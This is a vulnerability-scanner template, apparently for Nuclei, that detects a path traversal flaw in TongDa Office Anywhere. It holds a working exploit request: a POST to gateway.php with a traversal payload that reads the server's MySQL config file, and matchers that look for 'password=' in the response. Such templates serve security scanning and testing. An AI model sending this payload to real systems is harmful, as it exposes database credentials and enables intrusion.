id: tongda-path-traversal
info:
  name: Office Anywhere TongDa - Path Traversal
  author: pikpikcu
  severity: critical
  description: TongDa-Path-Traversal vulnerability in Office Anywhere allows for remote
    code execution through exploiting path traversal vulnerabilities.
  reference:
  - https://github.com/jas502n/OA-tongda-RCE
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: tongda,lfi
  metadata:
    impact: The path traversal vulnerability in Office Anywhere TongDa can have a
      significant impact by allowing remote code execution.
    recommendation: It is highly recommended to address the path traversal vulnerabilities
      in TongDa-Path Traversal, Office Anywhere to prevent the possibility of remote
      code execution.
requests:
- raw:
  - 'POST /ispirit/interface/gateway.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    json={"url":"/general/../../mysql5/my.ini"}

    '
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '[mysql]'
    - password=
    condition: and
  - type: word
    part: header
    words:
    - text/html
  - type: status
    status:
    - 200
